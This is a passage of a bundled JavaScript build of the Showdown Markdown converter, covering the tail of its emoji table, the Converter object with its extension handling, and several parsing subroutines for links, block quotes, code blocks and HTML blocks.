    "woman_shrugging": "\u{1F937}&zwj;\u2640\uFE0F",
    "woman_singer": "\u{1F469}&zwj;\u{1F3A4}",
    "woman_student": "\u{1F469}&zwj;\u{1F393}",
    "woman_teacher": "\u{1F469}&zwj;\u{1F3EB}",
    "woman_technologist": "\u{1F469}&zwj;\u{1F4BB}",
    "woman_with_turban": "\u{1F473}&zwj;\u2640\uFE0F",
    "womans_clothes": "\u{1F45A}",
    "womans_hat": "\u{1F452}",
    "women_wrestling": "\u{1F93C}&zwj;\u2640\uFE0F",
    "womens": "\u{1F6BA}",
    "world_map": "\u{1F5FA}",
    "worried": "\u{1F61F}",
    "wrench": "\u{1F527}",
    "writing_hand": "\u270D\uFE0F",
    "x": "\u274C",
    "yellow_heart": "\u{1F49B}",
    "yen": "\u{1F4B4}",
    "yin_yang": "\u262F\uFE0F",
    "yum": "\u{1F60B}",
    "zap": "\u26A1\uFE0F",
    "zipper_mouth_face": "\u{1F910}",
    "zzz": "\u{1F4A4}",
    /* special emojis :P */
    "octocat": '<img alt=":octocat:" height="20" width="20" align="absmiddle" src="https://assets-cdn.github.com/images/icons/emoji/octocat.png">',
    "showdown": `<span style="font-family: 'Anonymous Pro', monospace; text-decoration: underline; text-decoration-style: dashed; text-decoration-color: #3e8b8a;text-underline-position: under;">S</span>`
  };
  showdown.Converter = function(converterOptions) {
    "use strict";
    var options = {}, langExtensions = [], outputModifiers = [], listeners = {}, setConvFlavor = setFlavor, metadata = {
      parsed: {},
      raw: "",
      format: ""
    };
    _constructor();
    function _constructor() {
      converterOptions = converterOptions || {};
      for (var gOpt in globalOptions) {
        if (globalOptions.hasOwnProperty(gOpt)) {
          options[gOpt] = globalOptions[gOpt];
        }
      }
      if (typeof converterOptions === "object") {
        for (var opt in converterOptions) {
          if (converterOptions.hasOwnProperty(opt)) {
            options[opt] = converterOptions[opt];
          }
        }
      } else {
        throw Error("Converter expects the passed parameter to be an object, but " + typeof converterOptions + " was passed instead.");
      }
      if (options.extensions) {
        showdown.helper.forEach(options.extensions, _parseExtension);
      }
    }
    function _parseExtension(ext, name) {
      name = name || null;
      if (showdown.helper.isString(ext)) {
        ext = showdown.helper.stdExtName(ext);
        name = ext;
        if (showdown.extensions[ext]) {
          console.warn("DEPRECATION WARNING: " + ext + " is an old extension that uses a deprecated loading method.Please inform the developer that the extension should be updated!");
          legacyExtensionLoading(showdown.extensions[ext], ext);
          return;
        } else if (!showdown.helper.isUndefined(extensions[ext])) {
          ext = extensions[ext];
        } else {
          throw Error('Extension "' + ext + '" could not be loaded. It was either not found or is not a valid extension.');
        }
      }
      if (typeof ext === "function") {
        ext = ext();
      }
      if (!showdown.helper.isArray(ext)) {
        ext = [ext];
      }
      var validExt = validate(ext, name);
      if (!validExt.valid) {
        throw Error(validExt.error);
      }
      for (var i = 0; i < ext.length; ++i) {
        switch (ext[i].type) {
          case "lang":
            langExtensions.push(ext[i]);
            break;
          case "output":
            outputModifiers.push(ext[i]);
            break;
        }
        if (ext[i].hasOwnProperty("listeners")) {
          for (var ln in ext[i].listeners) {
            if (ext[i].listeners.hasOwnProperty(ln)) {
              listen(ln, ext[i].listeners[ln]);
            }
          }
        }
      }
    }
    function legacyExtensionLoading(ext, name) {
      if (typeof ext === "function") {
        ext = ext(new showdown.Converter());
      }
      if (!showdown.helper.isArray(ext)) {
        ext = [ext];
      }
      var valid = validate(ext, name);
      if (!valid.valid) {
        throw Error(valid.error);
      }
      for (var i = 0; i < ext.length; ++i) {
        switch (ext[i].type) {
          case "lang":
            langExtensions.push(ext[i]);
            break;
          case "output":
            outputModifiers.push(ext[i]);
            break;
          default:
            throw Error("Extension loader error: Type unrecognized!!!");
        }
      }
    }
    function listen(name, callback) {
      if (!showdown.helper.isString(name)) {
        throw Error("Invalid argument in converter.listen() method: name must be a string, but " + typeof name + " given");
      }
      if (typeof callback !== "function") {
        throw Error("Invalid argument in converter.listen() method: callback must be a function, but " + typeof callback + " given");
      }
      if (!listeners.hasOwnProperty(name)) {
        listeners[name] = [];
      }
      listeners[name].push(callback);
    }
    function rTrimInputText(text) {
      var rsp = text.match(/^\s*/)[0].length, rgx = new RegExp("^\\s{0," + rsp + "}", "gm");
      return text.replace(rgx, "");
    }
    this._dispatch = function dispatch(evtName, text, options2, globals) {
      if (listeners.hasOwnProperty(evtName)) {
        for (var ei = 0; ei < listeners[evtName].length; ++ei) {
          var nText = listeners[evtName][ei](evtName, text, this, options2, globals);
          if (nText && typeof nText !== "undefined") {
            text = nText;
          }
        }
      }
      return text;
    };
    this.listen = function(name, callback) {
      listen(name, callback);
      return this;
    };
    this.makeHtml = function(text) {
      if (!text) {
        return text;
      }
      const _ESCAPE_RE = /[&<>"]/g;
      const _ESCAPE_DICT = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;"
      };
      var globals = {
        gHtmlBlocks: [],
        gHtmlMdBlocks: [],
        gHtmlSpans: [],
        gUrls: {},
        gTitles: {},
        gDimensions: {},
        gListLevel: 0,
        hashLinkCounts: {},
        langExtensions,
        outputModifiers,
        converter: this,
        ghCodeBlocks: [],
        metadata: {
          parsed: {},
          raw: "",
          format: ""
        }
      };
      text = text.replace(/¨/g, "\xA8T");
      text = text.replace(/\$/g, "\xA8D");
      text = text.replace(/\r\n/g, "\n");
      text = text.replace(/\r/g, "\n");
      text = text.replace(/\u00A0/g, "&nbsp;");
      if (options.smartIndentationFix) {
        text = rTrimInputText(text);
      }
      text = "\n\n" + text + "\n\n";
      text = showdown.subParser("detab")(text, options, globals);
      text = text.replace(/^[ \t]+$/mg, "");
      showdown.helper.forEach(langExtensions, function(ext) {
        text = showdown.subParser("runExtension")(ext, text, options, globals);
      });
      text = showdown.subParser("metadata")(text, options, globals);
      text = showdown.subParser("hashPreCodeTags")(text, options, globals);
      text = showdown.subParser("githubCodeBlocks")(text, options, globals);
      text = showdown.subParser("hashHTMLBlocks")(text, options, globals);
      text = showdown.subParser("hashCodeTags")(text, options, globals);
      text = showdown.subParser("stripLinkDefinitions")(text, options, globals);
      text = showdown.subParser("blockGamut")(text, options, globals);
      text = showdown.subParser("unhashHTMLSpans")(text, options, globals);
      text = showdown.subParser("unescapeSpecialChars")(text, options, globals);
      text = text.replace(/¨D/g, "$$");
      text = text.replace(/¨T/g, "\xA8");
      text = showdown.subParser("completeHTMLDocument")(text, options, globals);
      showdown.helper.forEach(outputModifiers, function(ext) {
        text = showdown.subParser("runExtension")(ext, text, options, globals);
      });
      metadata = globals.metadata;
      return text;
    };
    this.makeMarkdown = this.makeMd = function(src, HTMLParser) {
      src = src.replace(/\r\n/g, "\n");
      src = src.replace(/\r/g, "\n");
      src = src.replace(/>[ \t]+</, ">\xA8NBSP;<");
      if (!HTMLParser) {
        if (window && window.document) {
          HTMLParser = window.document;
        } else {
          throw new Error("HTMLParser is undefined. If in a webworker or nodejs environment, you need to provide a WHATWG DOM and HTML such as JSDOM");
        }
      }
      var doc = HTMLParser.createElement("div");
      doc.innerHTML = src;
      var globals = {
        preList: substitutePreCodeTags(doc)
      };
      clean(doc);
      var nodes = doc.childNodes, mdDoc = "";
      for (var i = 0; i < nodes.length; i++) {
        mdDoc += showdown.subParser("makeMarkdown.node")(nodes[i], globals);
      }
      function clean(node) {
        for (var n = 0; n < node.childNodes.length; ++n) {
          var child = node.childNodes[n];
          if (child.nodeType === 3) {
            if (!/\S/.test(child.nodeValue) && !/^[ ]+$/.test(child.nodeValue)) {
              node.removeChild(child);
              --n;
            } else {
              child.nodeValue = child.nodeValue.split("\n").join(" ");
              child.nodeValue = child.nodeValue.replace(/(\s)+/g, "$1");
            }
          } else if (child.nodeType === 1) {
            clean(child);
          }
        }
      }
      function substitutePreCodeTags(doc2) {
        var pres = doc2.querySelectorAll("pre"), presPH = [];
        for (var i2 = 0; i2 < pres.length; ++i2) {
          if (pres[i2].childElementCount === 1 && pres[i2].firstChild.tagName.toLowerCase() === "code") {
            var content = pres[i2].firstChild.innerHTML.trim(), language = pres[i2].firstChild.getAttribute("data-language") || "";
            if (language === "") {
              var classes = pres[i2].firstChild.className.split(" ");
              for (var c = 0; c < classes.length; ++c) {
                var matches = classes[c].match(/^language-(.+)$/);
                if (matches !== null) {
                  language = matches[1];
                  break;
                }
              }
            }
            content = showdown.helper.unescapeHTMLEntities(content);
            presPH.push(content);
            pres[i2].outerHTML = '<precode language="' + language + '" precodenum="' + i2.toString() + '"></precode>';
          } else {
            presPH.push(pres[i2].innerHTML);
            pres[i2].innerHTML = "";
            pres[i2].setAttribute("prenum", i2.toString());
          }
        }
        return presPH;
      }
      return mdDoc;
    };
    this.setOption = function(key, value) {
      options[key] = value;
    };
    this.getOption = function(key) {
      return options[key];
    };
    this.getOptions = function() {
      return options;
    };
    this.addExtension = function(extension, name) {
      name = name || null;
      _parseExtension(extension, name);
    };
    this.useExtension = function(extensionName) {
      _parseExtension(extensionName);
    };
    this.setFlavor = function(name) {
      if (!flavor.hasOwnProperty(name)) {
        throw Error(name + " flavor was not found");
      }
      var preset = flavor[name];
      setConvFlavor = name;
      for (var option in preset) {
        if (preset.hasOwnProperty(option)) {
          options[option] = preset[option];
        }
      }
    };
    this.getFlavor = function() {
      return setConvFlavor;
    };
    this.removeExtension = function(extension) {
      if (!showdown.helper.isArray(extension)) {
        extension = [extension];
      }
      for (var a = 0; a < extension.length; ++a) {
        var ext = extension[a];
        for (var i = 0; i < langExtensions.length; ++i) {
          if (langExtensions[i] === ext) {
            langExtensions.splice(i, 1);
          }
        }
        for (var ii = 0; ii < outputModifiers.length; ++ii) {
          if (outputModifiers[ii] === ext) {
            outputModifiers.splice(ii, 1);
          }
        }
      }
    };
    this.getAllExtensions = function() {
      return {
        language: langExtensions,
        output: outputModifiers
      };
    };
    this.getMetadata = function(raw) {
      if (raw) {
        return metadata.raw;
      } else {
        return metadata.parsed;
      }
    };
    this.getMetadataFormat = function() {
      return metadata.format;
    };
    this._setMetadataPair = function(key, value) {
      metadata.parsed[key] = value;
    };
    this._setMetadataFormat = function(format) {
      metadata.format = format;
    };
    this._setMetadataRaw = function(raw) {
      metadata.raw = raw;
    };
  };
  showdown.subParser("anchors", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("anchors.before", text, options, globals);
    var writeAnchorTag = function(wholeMatch, linkText, linkId, url, m5, m6, title) {
      if (showdown.helper.isUndefined(title)) {
        title = "";
      }
      linkId = linkId.toLowerCase();
      if (wholeMatch.search(/\(<?\s*>? ?(['"].*['"])?\)$/m) > -1) {
        url = "";
      } else if (!url) {
        if (!linkId) {
          linkId = linkText.toLowerCase().replace(/ ?\n/g, " ");
        }
        url = "#" + linkId;
        if (!showdown.helper.isUndefined(globals.gUrls[linkId])) {
          url = globals.gUrls[linkId];
          if (!showdown.helper.isUndefined(globals.gTitles[linkId])) {
            title = globals.gTitles[linkId];
          }
        } else {
          return wholeMatch;
        }
      }
      url = url.replace(showdown.helper.regexes.asteriskDashAndColon, showdown.helper.escapeCharactersCallback);
      var result = '<a href="' + url + '"';
      if (title !== "" && title !== null) {
        title = title.replace(/"/g, "&quot;");
        title = title.replace(showdown.helper.regexes.asteriskDashAndColon, showdown.helper.escapeCharactersCallback);
        result += ' title="' + title + '"';
      }
      if (options.openLinksInNewWindow && !/^#/.test(url)) {
        result += ' rel="noopener noreferrer" target="\xA8E95Eblank"';
      }
      result += ">" + linkText + "</a>";
      return result;
    };
    text = text.replace(/\[((?:\[[^\]]*]|[^\[\]])*)] ?(?:\n *)?\[(.*?)]()()()()/g, writeAnchorTag);
    text = text.replace(
      /\[((?:\[[^\]]*]|[^\[\]])*)]()[ \t]*\([ \t]?<([^>]*)>(?:[ \t]*((["'])([^"]*?)\5))?[ \t]?\)/g,
      writeAnchorTag
    );
    text = text.replace(
      /\[((?:\[[^\]]*]|[^\[\]])*)]()[ \t]*\([ \t]?<?([\S]+?(?:\([\S]*?\)[\S]*?)?)>?(?:[ \t]*((["'])([^"]*?)\5))?[ \t]?\)/g,
      writeAnchorTag
    );
    text = text.replace(/\[([^\[\]]+)]()()()()()/g, writeAnchorTag);
    if (options.ghMentions) {
      text = text.replace(/(^|\s)(\\)?(@([a-z\d]+(?:[a-z\d.-]+?[a-z\d]+)*))/gmi, function(wm, st, escape, mentions, username) {
        if (escape === "\\") {
          return st + mentions;
        }
        if (!showdown.helper.isString(options.ghMentionsLink)) {
          throw new Error("ghMentionsLink option must be a string");
        }
        var lnk = options.ghMentionsLink.replace(/\{u}/g, username), target = "";
        if (options.openLinksInNewWindow) {
          target = ' rel="noopener noreferrer" target="\xA8E95Eblank"';
        }
        return st + '<a href="' + lnk + '"' + target + ">" + mentions + "</a>";
      });
    }
    text = globals.converter._dispatch("anchors.after", text, options, globals);
    return text;
  });
  var simpleURLRegex = /([*~_]+|\b)(((https?|ftp|dict):\/\/|www\.)[^'">\s]+?\.[^'">\s]+?)()(\1)?(?=\s|$)(?!["<>])/gi;
  var simpleURLRegex2 = /([*~_]+|\b)(((https?|ftp|dict):\/\/|www\.)[^'">\s]+\.[^'">\s]+?)([.!?,()\[\]])?(\1)?(?=\s|$)(?!["<>])/gi;
  var delimUrlRegex = /()<(((https?|ftp|dict):\/\/|www\.)[^'">\s]+)()>()/gi;
  var simpleMailRegex = /(^|\s)(?:mailto:)?([A-Za-z0-9!#$%&'*+-/=?^_`{|}~.]+@[-a-z0-9]+(\.[-a-z0-9]+)*\.[a-z]+)(?=$|\s)/gmi;
  var delimMailRegex = /<()(?:mailto:)?([-.\w]+@[-a-z0-9]+(\.[-a-z0-9]+)*\.[a-z]+)>/gi;
  var replaceLink = function(options) {
    "use strict";
    return function(wm, leadingMagicChars, link, m2, m3, trailingPunctuation, trailingMagicChars) {
      link = link.replace(showdown.helper.regexes.asteriskDashAndColon, showdown.helper.escapeCharactersCallback);
      var lnkTxt = link, append = "", target = "", lmc = leadingMagicChars || "", tmc = trailingMagicChars || "";
      if (/^www\./i.test(link)) {
        link = link.replace(/^www\./i, "http://www.");
      }
      if (options.excludeTrailingPunctuationFromURLs && trailingPunctuation) {
        append = trailingPunctuation;
      }
      if (options.openLinksInNewWindow) {
        target = ' rel="noopener noreferrer" target="\xA8E95Eblank"';
      }
      return lmc + '<a href="' + link + '"' + target + ">" + lnkTxt + "</a>" + append + tmc;
    };
  };
  var replaceMail = function(options, globals) {
    "use strict";
    return function(wholeMatch, b, mail) {
      var href = "mailto:";
      b = b || "";
      mail = showdown.subParser("unescapeSpecialChars")(mail, options, globals);
      if (options.encodeEmails) {
        href = showdown.helper.encodeEmailAddress(href + mail);
        mail = showdown.helper.encodeEmailAddress(mail);
      } else {
        href = href + mail;
      }
      return b + '<a href="' + href + '">' + mail + "</a>";
    };
  };
  showdown.subParser("autoLinks", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("autoLinks.before", text, options, globals);
    text = text.replace(delimUrlRegex, replaceLink(options));
    text = text.replace(delimMailRegex, replaceMail(options, globals));
    text = globals.converter._dispatch("autoLinks.after", text, options, globals);
    return text;
  });
  showdown.subParser("simplifiedAutoLinks", function(text, options, globals) {
    "use strict";
    if (!options.simplifiedAutoLink) {
      return text;
    }
    text = globals.converter._dispatch("simplifiedAutoLinks.before", text, options, globals);
    if (options.excludeTrailingPunctuationFromURLs) {
      text = text.replace(simpleURLRegex2, replaceLink(options));
    } else {
      text = text.replace(simpleURLRegex, replaceLink(options));
    }
    text = text.replace(simpleMailRegex, replaceMail(options, globals));
    text = globals.converter._dispatch("simplifiedAutoLinks.after", text, options, globals);
    return text;
  });
  showdown.subParser("blockGamut", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("blockGamut.before", text, options, globals);
    text = showdown.subParser("blockQuotes")(text, options, globals);
    text = showdown.subParser("headers")(text, options, globals);
    text = showdown.subParser("horizontalRule")(text, options, globals);
    text = showdown.subParser("lists")(text, options, globals);
    text = showdown.subParser("codeBlocks")(text, options, globals);
    text = showdown.subParser("tables")(text, options, globals);
    text = showdown.subParser("hashHTMLBlocks")(text, options, globals);
    text = showdown.subParser("paragraphs")(text, options, globals);
    text = globals.converter._dispatch("blockGamut.after", text, options, globals);
    return text;
  });
  showdown.subParser("blockQuotes", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("blockQuotes.before", text, options, globals);
    text = text + "\n\n";
    var rgx = /(^ {0,3}>[ \t]?.+\n(.+\n)*\n*)+/gm;
    if (options.splitAdjacentBlockquotes) {
      rgx = /^ {0,3}>[\s\S]*?(?:\n\n)/gm;
    }
    text = text.replace(rgx, function(bq) {
      bq = bq.replace(/^[ \t]*>[ \t]?/gm, "");
      bq = bq.replace(/¨0/g, "");
      bq = bq.replace(/^[ \t]+$/gm, "");
      bq = showdown.subParser("githubCodeBlocks")(bq, options, globals);
      bq = showdown.subParser("blockGamut")(bq, options, globals);
      bq = bq.replace(/(^|\n)/g, "$1  ");
      bq = bq.replace(/(\s*<pre>[^\r]+?<\/pre>)/gm, function(wholeMatch, m1) {
        var pre = m1;
        pre = pre.replace(/^  /mg, "\xA80");
        pre = pre.replace(/¨0/g, "");
        return pre;
      });
      return showdown.subParser("hashBlock")("<blockquote>\n" + bq + "\n</blockquote>", options, globals);
    });
    text = globals.converter._dispatch("blockQuotes.after", text, options, globals);
    return text;
  });
  showdown.subParser("codeBlocks", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("codeBlocks.before", text, options, globals);
    text += "\xA80";
    var pattern = /(?:\n\n|^)((?:(?:[ ]{4}|\t).*\n+)+)(\n*[ ]{0,3}[^ \t\n]|(?=¨0))/g;
    text = text.replace(pattern, function(wholeMatch, m1, m2) {
      var codeblock = m1, nextChar = m2, end = "\n";
      codeblock = showdown.subParser("outdent")(codeblock, options, globals);
      codeblock = showdown.subParser("encodeCode")(codeblock, options, globals);
      codeblock = showdown.subParser("detab")(codeblock, options, globals);
      codeblock = codeblock.replace(/^\n+/g, "");
      codeblock = codeblock.replace(/\n+$/g, "");
      if (options.omitExtraWLInCodeBlocks) {
        end = "";
      }
      codeblock = "<code><pre>" + codeblock + end + "</pre></code>";
      return showdown.subParser("hashBlock")(codeblock, options, globals) + nextChar;
    });
    text = text.replace(/¨0/, "");
    text = globals.converter._dispatch("codeBlocks.after", text, options, globals);
    return text;
  });
  showdown.subParser("codeSpans", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("codeSpans.before", text, options, globals);
    if (typeof text === "undefined") {
      text = "";
    }
    text = text.replace(
      /(^|[^\\])(`+)([^\r]*?[^`])\2(?!`)/gm,
      function(wholeMatch, m1, m2, m3) {
        var c = m3;
        c = c.replace(/^([ \t]*)/g, "");
        c = c.replace(/[ \t]*$/g, "");
        c = showdown.subParser("encodeCode")(c, options, globals);
        c = m1 + "<code>" + c + "</code>";
        c = showdown.subParser("hashHTMLSpans")(c, options, globals);
        return c;
      }
    );
    text = globals.converter._dispatch("codeSpans.after", text, options, globals);
    return text;
  });
  showdown.subParser("completeHTMLDocument", function(text, options, globals) {
    "use strict";
    if (!options.completeHTMLDocument) {
      return text;
    }
    text = globals.converter._dispatch("completeHTMLDocument.before", text, options, globals);
    var doctype = "html", doctypeParsed = "<!DOCTYPE HTML>\n", title = "", charset = '<meta charset="utf-8">\n', lang = "", metadata = "";
    if (typeof globals.metadata.parsed.doctype !== "undefined") {
      doctypeParsed = "<!DOCTYPE " + globals.metadata.parsed.doctype + ">\n";
      doctype = globals.metadata.parsed.doctype.toString().toLowerCase();
      if (doctype === "html" || doctype === "html5") {
        charset = '<meta charset="utf-8">';
      }
    }
    for (var meta in globals.metadata.parsed) {
      if (globals.metadata.parsed.hasOwnProperty(meta)) {
        switch (meta.toLowerCase()) {
          case "doctype":
            break;
          case "title":
            title = "<title>" + globals.metadata.parsed.title + "</title>\n";
            break;
          case "charset":
            if (doctype === "html" || doctype === "html5") {
              charset = '<meta charset="' + globals.metadata.parsed.charset + '">\n';
            } else {
              charset = '<meta name="charset" content="' + globals.metadata.parsed.charset + '">\n';
            }
            break;
          case "language":
          case "lang":
            lang = ' lang="' + globals.metadata.parsed[meta] + '"';
            metadata += '<meta name="' + meta + '" content="' + globals.metadata.parsed[meta] + '">\n';
            break;
          default:
            metadata += '<meta name="' + meta + '" content="' + globals.metadata.parsed[meta] + '">\n';
        }
      }
    }
    text = doctypeParsed + "<html" + lang + ">\n<head>\n" + title + charset + metadata + "</head>\n<body>\n" + text.trim() + "\n</body>\n</html>";
    text = globals.converter._dispatch("completeHTMLDocument.after", text, options, globals);
    return text;
  });
  showdown.subParser("detab", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("detab.before", text, options, globals);
    text = text.replace(/\t(?=\t)/g, "    ");
    text = text.replace(/\t/g, "\xA8A\xA8B");
    text = text.replace(/¨B(.+?)¨A/g, function(wholeMatch, m1) {
      var leadingText = m1, numSpaces = 4 - leadingText.length % 4;
      for (var i = 0; i < numSpaces; i++) {
        leadingText += " ";
      }
      return leadingText;
    });
    text = text.replace(/¨A/g, "    ");
    text = text.replace(/¨B/g, "");
    text = globals.converter._dispatch("detab.after", text, options, globals);
    return text;
  });
  showdown.subParser("ellipsis", function(text, options, globals) {
    "use strict";
    if (!options.ellipsis) {
      return text;
    }
    text = globals.converter._dispatch("ellipsis.before", text, options, globals);
    text = text.replace(/\.\.\./g, "\u2026");
    text = globals.converter._dispatch("ellipsis.after", text, options, globals);
    return text;
  });
  showdown.subParser("emoji", function(text, options, globals) {
    "use strict";
    if (!options.emoji) {
      return text;
    }
    text = globals.converter._dispatch("emoji.before", text, options, globals);
    var emojiRgx = /:([\S]+?):/g;
    text = text.replace(emojiRgx, function(wm, emojiCode) {
      if (showdown.helper.emojis.hasOwnProperty(emojiCode)) {
        return showdown.helper.emojis[emojiCode];
      }
      return wm;
    });
    text = globals.converter._dispatch("emoji.after", text, options, globals);
    return text;
  });
  showdown.subParser("encodeAmpsAndAngles", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("encodeAmpsAndAngles.before", text, options, globals);
    text = text.replace(/&(?!#?[xX]?(?:[0-9a-fA-F]+|\w+);)/g, "&amp;");
    text = text.replace(/<(?![a-z\/?$!])/gi, "&lt;");
    text = text.replace(/</g, "&lt;");
    text = text.replace(/>/g, "&gt;");
    text = globals.converter._dispatch("encodeAmpsAndAngles.after", text, options, globals);
    return text;
  });
  showdown.subParser("encodeBackslashEscapes", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("encodeBackslashEscapes.before", text, options, globals);
    text = text.replace(/\\(\\)/g, showdown.helper.escapeCharactersCallback);
    text = text.replace(/\\([`*_{}\[\]()>#+.!~=|:-])/g, showdown.helper.escapeCharactersCallback);
    text = globals.converter._dispatch("encodeBackslashEscapes.after", text, options, globals);
    return text;
  });
  showdown.subParser("encodeCode", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("encodeCode.before", text, options, globals);
    text = text.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/([*_{}\[\]\\=~-])/g, showdown.helper.escapeCharactersCallback);
    text = globals.converter._dispatch("encodeCode.after", text, options, globals);
    return text;
  });
  showdown.subParser("escapeSpecialCharsWithinTagAttributes", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("escapeSpecialCharsWithinTagAttributes.before", text, options, globals);
    var tags = /<\/?[a-z\d_:-]+(?:[\s]+[\s\S]+?)?>/gi, comments = /<!(--(?:(?:[^>-]|-[^>])(?:[^-]|-[^-])*)--)>/gi;
    text = text.replace(tags, function(wholeMatch) {
      return wholeMatch.replace(/(.)<\/?code>(?=.)/g, "$1`").replace(/([\\`*_~=|])/g, showdown.helper.escapeCharactersCallback);
    });
    text = text.replace(comments, function(wholeMatch) {
      return wholeMatch.replace(/([\\`*_~=|])/g, showdown.helper.escapeCharactersCallback);
    });
    text = globals.converter._dispatch("escapeSpecialCharsWithinTagAttributes.after", text, options, globals);
    return text;
  });
  showdown.subParser("githubCodeBlocks", function(text, options, globals) {
    "use strict";
    if (!options.ghCodeBlocks) {
      return text;
    }
    text = globals.converter._dispatch("githubCodeBlocks.before", text, options, globals);
    text += "\xA80";
    text = text.replace(/(?:^|\n)(?: {0,3})(```+|~~~+)(?: *)([^\s`~]*)\n([\s\S]*?)\n(?: {0,3})\1/g, function(wholeMatch, delim, language, codeblock) {
      var end = options.omitExtraWLInCodeBlocks ? "" : "\n";
      codeblock = showdown.subParser("encodeCode")(codeblock, options, globals);
      codeblock = showdown.subParser("detab")(codeblock, options, globals);
      codeblock = codeblock.replace(/^\n+/g, "");
      codeblock = codeblock.replace(/\n+$/g, "");
      codeblock = "<code" + (language ? ' class="' + language + " language-" + language + '"' : "") + "><pre>" + codeblock + end + "</pre></code>";
      codeblock = showdown.subParser("hashBlock")(codeblock, options, globals);
      return "\n\n\xA8G" + (globals.ghCodeBlocks.push({ text: wholeMatch, codeblock }) - 1) + "G\n\n";
    });
    text = text.replace(/¨0/, "");
    return globals.converter._dispatch("githubCodeBlocks.after", text, options, globals);
  });
  showdown.subParser("hashBlock", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("hashBlock.before", text, options, globals);
    text = text.replace(/(^\n+|\n+$)/g, "");
    text = "\n\n\xA8K" + (globals.gHtmlBlocks.push(text) - 1) + "K\n\n";
    text = globals.converter._dispatch("hashBlock.after", text, options, globals);
    return text;
  });
  showdown.subParser("hashCodeTags", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("hashCodeTags.before", text, options, globals);
    var repFunc = function(wholeMatch, match, left, right) {
      var codeblock = left + showdown.subParser("encodeCode")(match, options, globals) + right;
      return "\xA8C" + (globals.gHtmlSpans.push(codeblock) - 1) + "C";
    };
    text = showdown.helper.replaceRecursiveRegExp(text, repFunc, "<code\\b[^>]*>", "</code>", "gim");
    text = globals.converter._dispatch("hashCodeTags.after", text, options, globals);
    return text;
  });
  showdown.subParser("hashElement", function(text, options, globals) {
    "use strict";
    return function(wholeMatch, m1) {
      var blockText = m1;
      blockText = blockText.replace(/\n\n/g, "\n");
      blockText = blockText.replace(/^\n/, "");
      blockText = blockText.replace(/\n+$/g, "");
      blockText = "\n\n\xA8K" + (globals.gHtmlBlocks.push(blockText) - 1) + "K\n\n";
      return blockText;
    };
  });
  showdown.subParser("hashHTMLBlocks", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("hashHTMLBlocks.before", text, options, globals);
    var blockTags = [
      "pre",
      "div",
      "h1",
      "h2",
      "h3",
      "h4",
      "h5",
      "h6",
      "blockquote",
      "table",
      "dl",
      "ol",
      "ul",
      "script",
      "noscript",
      "form",
      "fieldset",
      "iframe",
      "math",
      "style",
      "section",
      "header",
      "footer",
      "nav",
      "article",
      "aside",
      "address",
      "audio",
      "canvas",
      "figure",
      "hgroup",
      "output",
      "video",
      "p"
    ], repFunc = function(wholeMatch, match, left, right) {
      var txt = wholeMatch;
      if (left.search(/\bmarkdown\b/) !== -1) {
        txt = left + globals.converter.makeHtml(match) + right;
      }
      return "\n\n\xA8K" + (globals.gHtmlBlocks.push(txt) - 1) + "K\n\n";
    };
    if (options.backslashEscapesHTMLTags) {
      text = text.replace(/\\<(\/?[^>]+?)>/g, function(wm, inside) {
        return "&lt;" + inside + "&gt;";
      });
    }
    for (var i = 0; i < blockTags.length; ++i) {
      var opTagPos, rgx1 = new RegExp("^ {0,3}(<" + blockTags[i] + "\\b[^>]*>)", "im"), patLeft = "<" + blockTags[i] + "\\b[^>]*>", patRight = "</" + blockTags[i] + ">";
      while ((opTagPos = showdown.helper.regexIndexOf(text, rgx1)) !== -1) {
        var subTexts = showdown.helper.splitAtIndex(text, opTagPos), newSubText1 = showdown.helper.replaceRecursiveRegExp(subTexts[1], repFunc, patLeft, patRight, "im");
        if (newSubText1 === subTexts[1]) {
          break;
        }
        text = subTexts[0].concat(newSubText1);
      }
    }
    text = text.replace(
      /(\n {0,3}(<(hr)\b([^<>])*?\/?>)[ \t]*(?=\n{2,}))/g,
      showdown.subParser("hashElement")(text, options, globals)
    );
    text = showdown.helper.replaceRecursiveRegExp(text, function(txt) {
      return "\n\n\xA8K" + (globals.gHtmlBlocks.push(txt) - 1) + "K\n\n";
    }, "^ {0,3}<!--", "-->", "gm");
    text = text.replace(
      /(?:\n\n)( {0,3}(?:<([?%])[^\r]*?\2>)[ \t]*(?=\n{2,}))/g,
      showdown.subParser("hashElement")(text, options, globals)
    );
    text = globals.converter._dispatch("hashHTMLBlocks.after", text, options, globals);
    return text;
  });
  showdown.subParser("hashHTMLSpans", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("hashHTMLSpans.before", text, options, globals);
    function hashHTMLSpan(html) {
      return "\xA8C" + (globals.gHtmlSpans.push(html) - 1) + "C";
    }
    text = text.replace(/<[^>]+?\/>/gi, function(wm) {
      return hashHTMLSpan(wm);
    });
    text = text.replace(/<([^>]+?)>[\s\S]*?<\/\1>/g, function(wm) {
      return hashHTMLSpan(wm);
    });
    text = text.replace(/<([^>]+?)\s[^>]+?>[\s\S]*?<\/\1>/g, function(wm) {
      return hashHTMLSpan(wm);
    });
    text = text.replace(/<[^>]+?>/gi, function(wm) {
      return hashHTMLSpan(wm);
    });
    text = globals.converter._dispatch("hashHTMLSpans.after", text, options, globals);
    return text;
  });
  showdown.subParser("unhashHTMLSpans", function(text, options, globals) {
    "use strict";
    text = globals.converter._dispatch("unhashHTMLSpans.before", text, options, globals);
    for (var i = 0; i < globals.gHtmlSpans.length; ++i) {
      var repText = globals.gHtmlSpans[i], limit = 0;
      while (/¨C(\d+)C/.test(repText)) {
        var num = RegExp.$1;
        repText = repText.replace("\xA8C" + num + "C", globals.gHtmlSpans[num]);
        if (limit === 10) {
          console.error("maximum nesting of 10 spans reached!!!");
          break;
        }
        ++limit;
      }
